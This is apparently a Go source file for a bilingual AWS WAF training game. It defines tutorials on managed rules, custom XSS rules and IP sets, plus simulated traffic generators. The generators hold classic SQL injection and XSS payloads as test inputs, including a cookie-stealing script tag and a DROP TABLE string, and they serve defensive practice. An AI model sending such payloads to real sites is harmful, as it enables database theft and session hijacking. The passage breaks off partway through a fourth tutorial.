package scenario

import (
	"fmt"
	"math/rand/v2"
	"net/url"
	"strconv"
	"time"
)

// 送信元 IP はすべてドキュメント用アドレス (RFC 5737) を X-Forwarded-For に入れて表現する。
//
//	203.0.113.0/24  : 一般ユーザー（.200 は社内 NAT）
//	198.51.100.0/24 : 攻撃者（.66 はブルートフォース、.77 は大量アクセス担当）
//	192.0.2.10-11   : 運営オフィス
//	192.0.2.64/26   : 検索エンジン (Googlebot) の公開 IP 範囲
//	192.0.2.201     : 攻撃者リストの単独 IP
//	192.0.2.208/28  : 攻撃者リストのネットワーク
//	192.0.2.224/28  : 上のすぐ隣にある一般ユーザーのネットワーク
const (
	officeIP1    = "192.0.2.10"
	officeIP2    = "192.0.2.11"
	googleRange  = "192.0.2.64/26"
	blockedIP    = "192.0.2.201"
	blockedRange = "192.0.2.208/28"
	corpNATIP    = "203.0.113.200"
	bruteForceIP = "198.51.100.66"
	floodIP      = "198.51.100.77"
)

const googlebotUA = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

var browserUAs = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 16; Pixel 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
}

var searchTerms = []string{"shoes", "red t-shirt", "coffee beans", "ノートパソコン", "summer sale", "gift card", "wireless earbuds", "登山 リュック"}

var comments = []string{
	"Great product, arrived quickly!",
	"サイズ感ぴったりでした。リピートします。",
	"The color is slightly different from the photo, but still nice.",
	"Would love to see this in blue.",
	"梱包が丁寧で好印象です",
	"5 stars - works as described :)",
}

var (
	clearNote = T(
		"クリア条件: スコア "+strconv.Itoa(TutorialClearScore)+" 点以上。",
		"To clear: score "+strconv.Itoa(TutorialClearScore)+" or higher.",
	)
	waitAndStart = S(T(
		"30〜60 秒ほど待ってから「攻撃開始」を押します。",
		"Wait 30–60 seconds for the change to propagate, then press \"Start attack\".",
	), T(
		"保存したルールは、すぐには効きません。AWS WAF の全体に行き渡るまで、通常 1 分ほどかかります。待たずに始めると最初の数件がすり抜けることがあり、結果に「反映が終わっていなかった可能性があります」と表示されます。",
		"Saved rules don't take effect instantly: a change usually takes about a minute to reach all of AWS WAF. If you start right away, the first few requests may slip through, and the result will point out that your rule may not have finished propagating.",
	))
	addOwnRule = S(T(
		"{acl} の「Rules」タブで「Add rules」→「Add my own rules and rule groups」を選びます。",
		"On the \"Rules\" tab of {acl}, choose \"Add rules\" → \"Add my own rules and rule groups\".",
	), T(
		"「Add managed rule groups」は、AWS や AWS Marketplace の出品者が用意したルールのまとまりを使うときに選びます。「Add my own rules and rule groups」は、自分でルールを組み立てるときに選びます。",
		"Choose \"Add managed rule groups\" to use ready-made sets of rules from AWS or AWS Marketplace sellers. Choose \"Add my own rules and rule groups\" to build a rule yourself.",
	), T(
		"自分で作るルールの「Rule type」は 3 種類です。IP set は、送信元が IP セットに載っているかで判定します。Rule builder は、検査する場所と条件を自由に組み立てます。Rule group は、自分で作ったルールグループをまとめて追加します。",
		"There are three rule types for your own rules. IP set decides by whether the source is in an IP set. Rule builder lets you freely combine what to inspect and how to match it. Rule group adds a rule group you created as a whole.",
	))
	blockAndSave = S(T(
		"「Action」で「Block」を選び、「Add rule」→「Save」します。",
		"Set \"Action\" to \"Block\", then click \"Add rule\" → \"Save\".",
	), T(
		"Action は、ルールに一致したリクエストをどうするかです。Allow は許可、Block は拒否します (既定では 403 を返します。Custom response で応答コードや本文を変えることもできます)。どちらもそこで評価を終えます。",
		"The action is what happens to requests that match the rule. Allow lets them through and Block rejects them (with a 403 by default; you can change the status code and body with a custom response). Both end the evaluation there.",
	), T(
		"Count は一致を記録するだけで、評価を続けます。新しいルールを本番で試運転するときに使います。CAPTCHA と Challenge は、パズルやブラウザかどうかのチェックを挟み、通過したものだけを通します。",
		"Count only records the match and keeps evaluating, which is useful for trial-running a new rule in production. CAPTCHA and Challenge insert a puzzle or a browser check and only let through requests that pass.",
	), T(
		"「Add rule」を押した時点では、まだ反映されていません。次の「Set rule priority」の画面で「Save」を押すと、Web ACL に保存されます。ルールは優先度の数字が小さい順に評価され、Allow や Block に一致した時点で止まります。どのルールにも一致しなかったリクエストには、Web ACL の Default action (この環境では Allow) が使われます。",
		"Clicking \"Add rule\" doesn't apply it yet; click \"Save\" on the next \"Set rule priority\" page to save it to the web ACL. Rules are evaluated from the lowest priority number up, and evaluation stops at the first Allow or Block match. Requests that match no rule get the web ACL's default action (Allow in this environment).",
	))
	// X-Forwarded-For から IP を取る設定の説明。IP セットのルールとレートベースルールで共通。
	xffInHeader = T(
		"「Source IP address」は、AWS WAF に直接つないできた相手の IP です。CDN やプロキシの後ろにあるサイトでは、これは CDN やプロキシの IP になり、本当のお客様の IP ではありません。「IP address in header」を選ぶと、X-Forwarded-For のようなヘッダーに書かれた IP で判定できます。",
		"\"Source IP address\" is the IP of whoever connected directly to AWS WAF. For a site behind a CDN or proxy, that's the CDN's or proxy's IP, not the real customer's. Choose \"IP address in header\" to decide by an IP written in a header such as X-Forwarded-For.",
	)
	xffFormat = T(
		"X-Forwarded-For には、経由したプロキシが順に IP を書き足していきます。たとえば X-Forwarded-For: 198.51.100.7, 203.0.113.10 なら、先頭 (左端) の 198.51.100.7 が最初にリクエストを送ったお客様、末尾 (右端) の 203.0.113.10 がサイトにいちばん近いプロキシが書き足した IP です。",
		"Each proxy along the way appends an IP to X-Forwarded-For. For example, in X-Forwarded-For: 198.51.100.7, 203.0.113.10, the first (leftmost) 198.51.100.7 is the customer who sent the request, and the last (rightmost) 203.0.113.10 was appended by the proxy closest to the site.",
	)
	xffSpoof = T(
		"注意: X-Forwarded-For はクライアントが自分で好きな値を書けるので、先頭の IP は偽装できます。本番では、自分の CDN が X-Forwarded-For を上書きする構成にするか、自分の CDN やロードバランサーが書き足した位置を使うのが安全です。この演習では「CDN がお客様の本当の IP を先頭に入れている」という設定なので、先頭の IP を使います。",
		"Caution: clients can write anything they like into X-Forwarded-For, so the first IP can be spoofed. In production, it's safer to have your own CDN overwrite X-Forwarded-For, or to use the position your own CDN or load balancer appends. In this exercise, the CDN puts the customer's real IP first, so you use the first IP.",
	)
	xffFallback = T(
		"Fallback for missing IP address は、ヘッダーがないときや IP として読めない値だったときの扱いです。Match は一致したとみなし (Block ならブロック)、No match は一致しなかったとみなします。今回は、ヘッダーのない通信まで止めないように No match にします。",
		"Fallback for missing IP address decides what happens when the header is missing or doesn't hold a valid IP. Match treats it as a match (blocked, if the action is Block), and No match treats it as no match. Here you choose No match so that requests without the header aren't blocked.",
	)
	// コンソールで「IP アドレスをヘッダーから取る」設定 (IP セットのルール用)。
	xffStep = S(T(
		"「IP address to use」で「IP address in header」を選び、Header field name に X-Forwarded-For、Position に First IP address、Fallback for missing IP address に No match を指定します。",
		"Under \"IP address to use\", choose \"IP address in header\". Set Header field name to X-Forwarded-For, Position to First IP address, and Fallback for missing IP address to No match.",
	), xffInHeader, xffFormat, T(
		"Position は、ヘッダーに並んだ IP のどれを調べるかです。First IP address は先頭 (左端) の IP、つまり最初にリクエストを送ったお客様の IP を調べます。Last IP address は末尾 (右端) の IP、つまりサイトにいちばん近いプロキシが書き足した IP を調べます。Any IP address は、並んだ IP のどれか 1 つでも IP セットに載っていれば一致とみなします (IP が 10 個を超えるときは、末尾の 10 個だけを調べます)。",
		"Position chooses which IP in the header to inspect. First IP address inspects the first (leftmost) IP, i.e. the customer who sent the request. Last IP address inspects the last (rightmost) IP, i.e. the one appended by the proxy closest to the site. Any IP address matches if any IP in the list is in the IP set (if there are more than 10, only the last 10 are inspected).",
	), xffSpoof, xffFallback)
	xffNote = T(
		"このサイトは CDN の後ろにあるため、本当のアクセス元 IP は X-Forwarded-For ヘッダーの先頭に入っています。",
		"This site sits behind a CDN, so the real client IP is the first address in the X-Forwarded-For header.",
	)
	lblBrowse  = T("一般ユーザーの閲覧", "Regular users browsing")
	lblComment = T("一般ユーザーの口コミ投稿", "Regular users posting reviews")
)

func pick[T any](r *rand.Rand, xs []T) T { return xs[r.IntN(len(xs))] }

func browserUA(r *rand.Rand) string { return pick(r, browserUAs) }

func userIP(r *rand.Rand) string { return fmt.Sprintf("203.0.113.%d", 1+r.IntN(199)) }

func attackerIP(r *rand.Rand) string {
	for {
		n := 1 + r.IntN(253)
		if n != 66 && n != 77 {
			return fmt.Sprintf("198.51.100.%d", n)
		}
	}
}

func googleIP(r *rand.Rand) string { return fmt.Sprintf("192.0.2.%d", 64+r.IntN(64)) }

func officeIP(r *rand.Rand) string { return pick(r, []string{officeIP1, officeIP2}) }

func q(key, value string) string { return key + "=" + url.QueryEscape(value) }

func form(kv ...string) string {
	v := url.Values{}
	for i := 0; i+1 < len(kv); i += 2 {
		v.Set(kv[i], kv[i+1])
	}
	return v.Encode()
}

func get(r *rand.Rand, path, rawQuery string) Request {
	return Request{Path: path, RawQuery: rawQuery, Headers: map[string]string{"User-Agent": browserUA(r)}, ClientIP: userIP(r)}
}

func post(r *rand.Rand, path, body string) Request {
	return Request{
		Method:   "POST",
		Path:     path,
		Body:     body,
		Headers:  map[string]string{"User-Agent": browserUA(r), "Content-Type": "application/x-www-form-urlencoded"},
		ClientIP: userIP(r),
	}
}

// browse は一般ユーザーの閲覧。どのシナリオでも誤検知の確認に使う。
func browse(r *rand.Rand) Request {
	switch r.IntN(3) {
	case 0:
		return get(r, "/", "")
	case 1:
		return get(r, "/search", q("q", pick(r, searchTerms)))
	default:
		return get(r, "/products/"+strconv.Itoa(100+r.IntN(900)), "")
	}
}

func fromAttacker(req Request, r *rand.Rand) Request {
	req.ClientIP = attackerIP(r)
	return req
}

func comment(r *rand.Rand, text string) Request {
	return post(r, "/comment", form("product", strconv.Itoa(100+r.IntN(900)), "comment", text))
}

func benignComment(r *rand.Rand) Request { return comment(r, pick(r, comments)) }

func withUA(req Request, ua string) Request {
	req.Headers["User-Agent"] = ua
	return req
}

func init() {
	registerTutorials()
	registerJA4Tutorial()
	registerGames()
	registerJA4Game()
	registerLabs()
}

// ---------------------------------------------------------------------------
// チュートリアル: AWS WAF の基本機能を 1 つずつ、手順を見ながら設定する
// ---------------------------------------------------------------------------

func registerTutorials() {
	register(&Scenario{
		ID:       "tutorial-1-sqli",
		Title:    T("チュートリアル 1: マネージドルールで SQL インジェクションを止める", "Tutorial 1: Stop SQL injection with a managed rule group"),
		Tutorial: true,
		Summary: T(
			"検索ページに SQL インジェクションが届きます。AWS が用意したマネージドルールグループを追加して防ぎます。",
			"SQL injection is hitting the search page. Add an AWS managed rule group to block it.",
		),
		Topics: []Text{T("マネージドルールグループ", "Managed rule groups"), T("Web ACL の基本", "Web ACL basics")},
		Briefing: []Text{
			T("あなたは EC サイトのセキュリティ担当です。検索ページ /search の q パラメータに、SQL 文を混ぜ込んだリクエストが届き始めました。",
				"You are in charge of security for an online shop. Requests with SQL fragments mixed into the q parameter of the search page (/search) have started arriving."),
			T("AWS WAF には、よくある攻撃をまとめて防ぐ「マネージドルールグループ」が用意されています。まずはこれを使ってみましょう。",
				"AWS WAF offers \"managed rule groups\" that block common attacks out of the box. Let's start with one of those."),
			T("一般のお客様の検索も同時に届きます。お客様の検索はブロックしないでください。",
				"Regular customers are searching at the same time. Don't block their searches."),
			clearNote,
		},
		Steps: []Step{
			S(T("AWS マネジメントコンソールで「WAF & Shield」を開きます。", "Open \"WAF & Shield\" in the AWS Management Console."),
				T("AWS WAF と、DDoS 対策の AWS Shield は、同じ「WAF & Shield」の画面にまとまっています。新しい画面では、Web ACL の一覧が「Protection packs (web ACLs)」という名前になっていることがあります。",
					"AWS WAF and AWS Shield (DDoS protection) share the same \"WAF & Shield\" console. In the new console, the list of web ACLs may be labeled \"Protection packs (web ACLs)\".")),
			S(T("リージョンを {region} に切り替え、「Web ACLs」から {acl} を開きます。（画面上部のリンクから直接開けます）",
				"Switch the region to {region} and open {acl} under \"Web ACLs\". (You can also use the link at the top of this page.)"),
				T("Web ACL は、ルールを並べたリストです。ALB や CloudFront などのリソースに関連付けると、そのリソースに届くリクエストを上から順にルールで調べます。",
					"A web ACL is an ordered list of rules. Once associated with a resource such as an ALB or CloudFront, it checks every request to that resource against the rules in order."),
				T("Web ACL には 2 種類の範囲があります。Regional は ALB・API Gateway・AppSync などリージョンのリソース用で、使うリージョンで作ります。CloudFront 用は「Global (CloudFront)」で作ります。この演習の ALB は {region} にあるので、Regional の Web ACL を使います。",
					"Web ACLs come in two scopes. Regional is for regional resources such as ALB, API Gateway, and AppSync, and is created in the region where you use it. For CloudFront, choose \"Global (CloudFront)\". The ALB in this exercise is in {region}, so you use a regional web ACL.")),
			S(T("「Rules」タブで「Add rules」→「Add managed rule groups」を選びます。", "On the \"Rules\" tab, choose \"Add rules\" → \"Add managed rule groups\"."),
				T("マネージドルールグループは、よくある攻撃を防ぐルールをまとめたものです。中身は提供元が更新してくれるので、自分で攻撃のパターンを調べて書かなくても使えます。",
					"A managed rule group bundles rules against common attacks. The provider keeps them up to date, so you can use them without researching and writing attack patterns yourself."),
				T("AWS が提供するもの (AWS managed rule groups) のほとんどは追加料金なしで使えます。Bot Control やアカウント乗っ取り対策などの一部と、AWS Marketplace の出品者が提供するものは有料です。",
					"Most AWS managed rule groups come at no extra charge. A few, such as Bot Control and account takeover prevention, cost extra, as do rule groups from AWS Marketplace sellers.")),
			S(T("「AWS managed rule groups」を開き、「SQL database」(AWSManagedRulesSQLiRuleSet) を「Add to web ACL」にして「Add rules」を押します。",
				"Expand \"AWS managed rule groups\", toggle \"Add to web ACL\" for \"SQL database\" (AWSManagedRulesSQLiRuleSet), and click \"Add rules\"."),
				T("SQL database は、クエリ文字列・Body・Cookie・URI パスなどに SQL インジェクションの形がないかを調べるルールグループです。",
					"SQL database is a rule group that looks for SQL injection patterns in the query string, body, cookies, URI path, and more."),
				T("ルールグループの横の「Edit」からは、バージョンの固定や、個別のルールのアクションを Count などに変える (Override) ことができます。正規の通信を誤って止めるときの直し方は、ラボの Level 4 で練習します。",
					"Use \"Edit\" next to a rule group to pin its version or override individual rules' actions (to Count, for example). You'll practice fixing a managed rule that blocks legitimate traffic in Lab Level 4."),
				T("ルールには、重さを表す WCU (Web ACL capacity units) があります。SQL database は 200 WCU です。1 つの Web ACL で使える WCU には上限 (既定で 1,500) があります。",
					"Each rule has a cost measured in WCU (web ACL capacity units). SQL database uses 200 WCU, and a web ACL has a WCU limit (1,500 by default).")),
			S(T("ルールの優先度はそのままで「Save」します。", "Keep the default rule priority and click \"Save\"."),
				T("ルールは優先度の数字が小さい順 (画面の上から順) に評価され、Allow や Block に一致した時点で止まります。どのルールにも一致しなかったリクエストには、Web ACL の Default action (この環境では Allow) が使われます。",
					"Rules are evaluated from the lowest priority number (top of the list) down, and evaluation stops at the first Allow or Block match. Requests that match no rule get the web ACL's default action (Allow in this environment)."),
				T("「Save」を押すまで、変更は Web ACL に保存されません。",
					"Your changes aren't saved to the web ACL until you click \"Save\".")),
			waitAndStart,
		},
		Duration: 30 * time.Second,
		Patterns: []Pattern{
			{Attack, T("OR 1=1 による認証回避", "Auth bypass with OR 1=1"), 10, func(r *rand.Rand) Request {
				return fromAttacker(get(r, "/search", q("q", "' OR '1'='1")), r)
			}},
			{Attack, T("UNION SELECT による情報窃取", "Data theft with UNION SELECT"), 10, func(r *rand.Rand) Request {
				return fromAttacker(get(r, "/search", q("q", "1' UNION SELECT username,password FROM users--")), r)
			}},
			{Attack, T("時間差を使うブラインド SQLi", "Time-based blind SQLi"), 10, func(r *rand.Rand) Request {
				return fromAttacker(get(r, "/search", q("q", "1' AND SLEEP(5)--")), r)
			}},
			{Attack, T("スタッククエリ", "Stacked query"), 10, func(r *rand.Rand) Request {
				return fromAttacker(get(r, "/search", q("q", "1'; DROP TABLE products;--")), r)
			}},
			{Benign, T("一般ユーザーの検索・閲覧", "Regular users searching and browsing"), 60, browse},
		},
	})

	register(&Scenario{
		ID:       "tutorial-2-xss",
		Title:    T("チュートリアル 2: カスタムルールで XSS を止める", "Tutorial 2: Stop XSS with a custom rule"),
		Tutorial: true,
		Summary: T(
			"口コミ投稿 (POST /comment) にスクリプトが書き込まれます。自分でルールを組み立てて、リクエストの Body を検査します。",
			"Scripts are being posted to the review form (POST /comment). Build your own rule that inspects the request body.",
		),
		Topics: []Text{T("カスタムルール (Rule builder)", "Custom rules (Rule builder)"), T("Body の検査", "Inspecting the body"), T("テキスト変換", "Text transformations")},
		Briefing: []Text{
			T("商品の口コミ投稿 POST /comment に、HTML タグやスクリプトを含む投稿が届いています。そのまま表示すると、他のお客様のブラウザでスクリプトが実行されてしまいます（クロスサイトスクリプティング、XSS）。",
				"Posts containing HTML tags and scripts are arriving at the product review form, POST /comment. If they were displayed as-is, the scripts would run in other customers' browsers (cross-site scripting, XSS)."),
			T("今回はマネージドルールではなく、検査する場所と方法を自分で決める「カスタムルール」を作ります。",
				"This time, instead of a managed rule group, you'll build a \"custom rule\" where you decide what to inspect and how."),
			T("フォームの内容は URL エンコードされて Body に入っています（< は %3C になります）。そのまま検査すると見つけられないので、「テキスト変換」でデコードしてから検査します。",
				"Form data is URL-encoded in the body (< becomes %3C). Inspecting it as-is would miss the attack, so use \"text transformations\" to decode it first."),
			clearNote,
		},
		Steps: []Step{
			addOwnRule,
			S(T("「Rule builder」で Name に block-xss と入力し、Type は「Regular rule」のままにします。", "In \"Rule builder\", enter block-xss as the Name and keep Type as \"Regular rule\"."),
				T("Name はルールの名前で、WAF のログやメトリクスにもこの名前で出ます。何を止めるルールかがわかる名前にしておくと、あとで調べやすくなります。",
					"The name identifies the rule and also appears in WAF logs and metrics. A name that says what the rule blocks makes later investigation easier."),
				T("Type の「Regular rule」は、1 件ずつリクエストの中身を調べるルールです。「Rate-based rule」は、同じ送信元から一定時間内に何回来たかで判定するルールです (チュートリアル 5 で使います)。",
					"A \"Regular rule\" inspects each request's contents one by one. A \"Rate-based rule\" decides by how many requests the same source sends in a time window (you'll use one in Tutorial 5).")),
			S(T("「If a request」は「matches the statement」を選びます。", "Set \"If a request\" to \"matches the statement\"."),
				T("条件 (Statement) の組み合わせ方を選びます。matches the statement は条件が 1 つのとき、matches all the statements (AND) はすべての条件に一致したとき、matches at least one of the statements (OR) はどれか 1 つに一致したとき、doesn't match the statement (NOT) は条件に一致しなかったときに、ルールが一致します。",
					"This chooses how statements are combined. The rule matches: with matches the statement, when its single statement matches; with matches all the statements (AND), when all match; with matches at least one of the statements (OR), when any matches; with doesn't match the statement (NOT), when the statement doesn't match.")),
			S(T("「Inspect」で「Body」を選び、Content type は「Plain text」のままにします。", "Set \"Inspect\" to \"Body\" and keep Content type as \"Plain text\"."),
				T("Inspect は、リクエストのどこを調べるかです。URI path、Query string、Single query parameter (特定のパラメータ)、Single header、All headers、Cookies、Body、JSON body、HTTP method、JA4 fingerprint などがあります。口コミの本文はフォームで POST されるので、Body を調べます。",
					"Inspect chooses which part of the request to examine: URI path, Query string, Single query parameter, Single header, All headers, Cookies, Body, JSON body, HTTP method, JA4 fingerprint, and more. Review text is POSTed from a form, so you inspect the Body."),
				T("Content type の Plain text は Body をそのまま 1 つの文字列として調べます。JSON を選ぶと Body を JSON として読み、特定のキーの値だけを調べることもできます。",
					"With Content type Plain text, the body is inspected as a single string. Choosing JSON parses the body as JSON, letting you inspect only specific keys if you want."),
				T("AWS WAF が調べられる Body の大きさには上限があります。ALB は先頭の 8 KB だけで、これは変えられません。CloudFront などは既定で 16 KB で、最大 64 KB まで広げられます (ラボの Level 4 で体験できます)。",
					"AWS WAF can only inspect a limited amount of the body: the first 8 KB on ALB, which can't be changed. CloudFront and some others default to 16 KB and can be raised to 64 KB (try it in Lab Level 4).")),
			S(T("「Match type」で「Contains XSS injection attacks」を選びます。", "Set \"Match type\" to \"Contains XSS injection attacks\"."),
				T("Match type は、調べた値をどう判定するかです。文字列の一致 (Exactly matches / Starts with / Ends with / Contains string / Contains words)、正規表現、サイズ、SQL インジェクションや XSS の検出などがあります。",
					"Match type decides how the inspected value is judged: string matches (Exactly matches / Starts with / Ends with / Contains string / Contains words), regular expressions, size, or SQL injection and XSS detection."),
				T("「Contains XSS injection attacks」は、AWS WAF に組み込まれた XSS の検出機能です。<script> だけでなく、onerror などのイベント属性や javascript: のような書き方も見つけてくれるので、攻撃の文字列を自分で並べるより漏れが少なくなります。",
					"\"Contains XSS injection attacks\" uses AWS WAF's built-in XSS detection. It catches not just <script> but also event attributes such as onerror and forms like javascript:, so it misses less than listing attack strings yourself.")),
			S(T("「Text transformation」で「URL decode」を追加し、さらに「HTML entity decode」も追加します。", "Under \"Text transformation\", add \"URL decode\", then also add \"HTML entity decode\"."),
				T("テキスト変換は、検査の前に値を整える処理です。攻撃者は %3Cscript%3E (URL エンコード) や &lt;script&gt; (HTML エンティティ) のように書き方を変えて検査をすり抜けようとするので、元の形に戻してから調べます。",
					"Text transformations normalize the value before inspection. Attackers disguise payloads as %3Cscript%3E (URL encoding) or &lt;script&gt; (HTML entities) to slip past checks, so you decode them back first."),
				T("変換は、Priority の数字が小さい順にすべて適用されてから検査されます。今回は URL decode → HTML entity decode の順です。Lowercase (小文字にする)、Compress whitespace (空白をまとめる) などもあり、1 つのルールに最大 10 個まで追加できます。",
					"All transformations are applied in order of their priority number, lowest first, before inspection; here, URL decode → HTML entity decode. Others include Lowercase and Compress whitespace, and you can add up to 10 to a statement.")),
			S(T("「Oversize handling」は「Continue」のままにします。", "Keep \"Oversize handling\" as \"Continue\"."),
				T("Oversize handling は、Body が検査の上限 (ALB は 8 KB) を超えたときの扱いです。Continue は上限までの部分だけを調べます。Match は一致したとみなし (Block ならブロック)、No match は一致しなかったとみなします。",
					"Oversize handling decides what happens when the body exceeds the inspection limit (8 KB on ALB). Continue inspects only the part within the limit. Match treats the request as a match (blocked, if the action is Block), and No match treats it as no match."),
				T("Continue だと、上限より後ろに攻撃を置かれるとすり抜けます。一方、Match にすると大きな正規の投稿まで止めてしまいます。この使い分けは、ラボの Level 4「8 KB の壁」で練習します。",
					"With Continue, an attack placed beyond the limit slips through; with Match, large legitimate posts get blocked too. You'll practice this trade-off in Lab Level 4, \"The 8 KB wall\".")),
			blockAndSave,
			waitAndStart,
		},
		Duration: 30 * time.Second,
		Patterns: []Pattern{
			{Attack, T("script タグ", "script tag"), 12, func(r *rand.Rand) Request {
				return fromAttacker(comment(r, "<script>alert(document.cookie)</script>"), r)
			}},
			{Attack, T("img タグの onerror", "img tag with onerror"), 12, func(r *rand.Rand) Request {
				return fromAttacker(comment(r, `<img src=x onerror=alert(1)>`), r)
			}},
			{Attack, T("svg の onload", "svg with onload"), 12, func(r *rand.Rand) Request {
				return fromAttacker(comment(r, `<svg onload=alert(1)>`), r)
			}},
			{Benign, lblComment, 30, benignComment},
			{Benign, lblBrowse, 30, browse},
		},
	})

	register(&Scenario{
		ID:       "tutorial-3-ipset",
		Title:    T("チュートリアル 3: IP セットで攻撃者をブロックする", "Tutorial 3: Block attackers with an IP set"),
		Tutorial: true,
		Summary: T(
			"攻撃者リストに載っている IP アドレスからのアクセスを、IP セットを使ってまとめてブロックします。",
			"Use an IP set to block every address on a threat list in one go.",
		),
		Topics: []Text{T("IP セット", "IP sets"), T("CIDR 表記", "CIDR notation"), T("X-Forwarded-For", "X-Forwarded-For")},
		Briefing: []Text{
			T("セキュリティベンダーから攻撃者リストが届きました。次の IP アドレスからのアクセスをすべて止めてください。",
				"A security vendor sent you a list of attacker addresses. Block all traffic from the following:"),
			T("・"+blockedIP+"（単独の IP アドレス）", "• "+blockedIP+" (a single address)"),
			T("・"+blockedRange+"（192.0.2.208 〜 192.0.2.223 の 16 個）", "• "+blockedRange+" (the 16 addresses 192.0.2.208–192.0.2.223)"),
			T("このサイトは CDN の後ろにあるため、ALB から見た送信元 IP はすべて CDN のものになります。本当のアクセス元 IP は X-Forwarded-For ヘッダーの先頭に入っています。",
				"This site sits behind a CDN, so to the ALB every request appears to come from the CDN. The real client IP is the first address in the X-Forwarded-For header."),
			T("すぐ隣の 192.0.2.224 〜 192.0.2.239 には一般のお客様がいます。範囲を広げすぎないように注意してください。",
				"Regular customers are in the neighboring range 192.0.2.224–192.0.2.239. Be careful not to make the range too wide."),
			clearNote,
		},
		Steps: []Step{
			S(T("WAF & Shield の左メニューで「IP sets」を開き、リージョンが {region} であることを確認して「Create IP set」を押します。",
				"In the WAF & Shield left menu, open \"IP sets\", make sure the region is {region}, and click \"Create IP set\"."),
				T("IP セットは、IP アドレスの一覧を Web ACL とは別に保存しておく部品です。複数のルールや Web ACL から使い回せて、一覧を書き換えると、使っているすべてのルールに反映されます。",
					"An IP set is a list of IP addresses stored separately from the web ACL. Several rules and web ACLs can share it, and editing the list updates every rule that uses it."),
				T("IP セットは、使う Web ACL と同じ範囲 (同じリージョン、または Global (CloudFront)) に作る必要があります。",
					"An IP set must be created in the same scope as the web ACL that uses it (the same region, or Global (CloudFront)).")),
			S(T("Name に {acl}-blocked-ips と入力し、IP version は IPv4 のままにします。(IP セットの名前は {acl}- で始める決まりです)", "Enter {acl}-blocked-ips as the Name and keep IP version as IPv4. (IP set names must start with {acl}-.)"),
				T("1 つの IP セットには、IPv4 か IPv6 のどちらか一方しか入れられません。両方を止めたいときは、IP セットを 2 つ作ります。",
					"An IP set holds either IPv4 or IPv6 addresses, not both. To block both, create two IP sets."),
				T("名前の決まりはこの演習だけのものです。ほかの参加者の IP セットと混ざらないように、権限で {acl}- で始まる名前しか作れないようにしています。",
					"The naming rule is specific to this exercise: permissions only allow names starting with {acl}- so that your IP sets don't mix with other players'.")),
			S(T("IP addresses に 1 行ずつ "+blockedIP+"/32 と "+blockedRange+" を入力して「Create IP set」を押します。",
				"Enter "+blockedIP+"/32 and "+blockedRange+" in IP addresses, one per line, then click \"Create IP set\"."),
				T("IP アドレスは CIDR 表記で書きます。/ の後ろの数字は「先頭から何ビットが同じか」で、数字が小さいほど範囲が広くなります。/32 は 1 個だけ、/28 は 16 個、/24 は 256 個です。",
					"Addresses are written in CIDR notation. The number after / says how many leading bits are fixed; the smaller it is, the wider the range. /32 is a single address, /28 is 16 addresses, and /24 is 256."),
				T(blockedRange+" は 192.0.2.208 〜 192.0.2.223 の 16 個です。範囲の始まりは /28 の区切り (16 の倍数) に合わせる必要があります。隣の 192.0.2.224 からは別のネットワークで、そこには一般のお客様がいます。",
					blockedRange+" covers the 16 addresses 192.0.2.208–192.0.2.223. The range must start on a /28 boundary (a multiple of 16). The neighboring network starting at 192.0.2.224 belongs to regular customers.")),
			addOwnRule,
			S(T("「Rule type」で「IP set」を選び、Name に block-bad-ips と入力して、IP set に {acl}-blocked-ips を選びます。",
				"Set \"Rule type\" to \"IP set\", enter block-bad-ips as the Name, and select {acl}-blocked-ips as the IP set."),
				T("Rule type の IP set は、送信元の IP が IP セットに載っているかだけで判定する、いちばん単純なルールです。テキスト変換などの設定はありません。",
					"The IP set rule type is the simplest rule: it only checks whether the source IP is in the IP set. There are no text transformations or other settings."),
				T("IP 以外の条件 (パスなど) と組み合わせたいときは、Rule builder で「Originates from an IP address in」を条件の 1 つとして使います (ゲームモードで使います)。",
					"To combine it with other conditions (such as the path), use \"Originates from an IP address in\" as one statement in the Rule builder (you'll do this in game mode).")),
			xffStep,
			blockAndSave,
			waitAndStart,
		},
		Duration: 30 * time.Second,
		Patterns: []Pattern{
			{Attack, T("攻撃者リストの単独 IP ("+blockedIP+")", "Listed single address ("+blockedIP+")"), 15, func(r *rand.Rand) Request {
				req := browse(r)
				req.ClientIP = blockedIP
				return req
			}},
			{Attack, T("攻撃者リストのネットワーク ("+blockedRange+")", "Listed network ("+blockedRange+")"), 25, func(r *rand.Rand) Request {
				req := browse(r)
				req.ClientIP = fmt.Sprintf("192.0.2.%d", 208+r.IntN(16))
				return req
			}},
			{Benign, T("隣のネットワークの一般ユーザー (192.0.2.224/28)", "Regular users in the neighboring network (192.0.2.224/28)"), 20, func(r *rand.Rand) Request {
				req := browse(r)
				req.ClientIP = fmt.Sprintf("192.0.2.%d", 224+r.IntN(16))
				return req
			}},
			{Benign, lblBrowse, 40, browse},
		},
	})

	register(&Scenario{
		ID:       "tutorial-4-useragent",
		Title:    T("チュートリアル 4: 文字列マッチで攻撃ツールを見分ける", "Tutorial 4: Spot attack tools with string matching"),
		Tutorial: true,
		Summary: T(
			"脆弱性スキャナーが User-Agent に自分の名前を書いたまま探索してきます。ヘッダーの文字列で見分けてブロックします。",
			"Vulnerability scanners are probing the site with their own names in the User-Agent. Identify them by header string and block them.",
		),
		Topics: []Text{T("ヘッダーの検査", "Inspecting headers"), T("文字列マッチ", "String matching"), T("OR ステートメント", "OR statements"), T("Lowercase 変換", "Lowercase transformation")},
		Briefing: []Text{
			T("サイト全体に対して、既知の脆弱性スキャナー sqlmap と Nikto による探索が始まりました。/.env や /wp-login.php など、存在しないファイルも次々に要求されています。",
				"The well-known vulnerability scanners sqlmap and Nikto have started probing the whole site, requesting files that don't exist such as /.env and /wp-login.php."),
			T("送信元 IP は毎回変わるため、IP では止められません。ただし、どちらのツールもリクエストの User-Agent ヘッダーに自分の名前を書いています。",
				"The source IP changes every time, so IP rules won't help. However, both tools put their own name in the User-Agent header."),
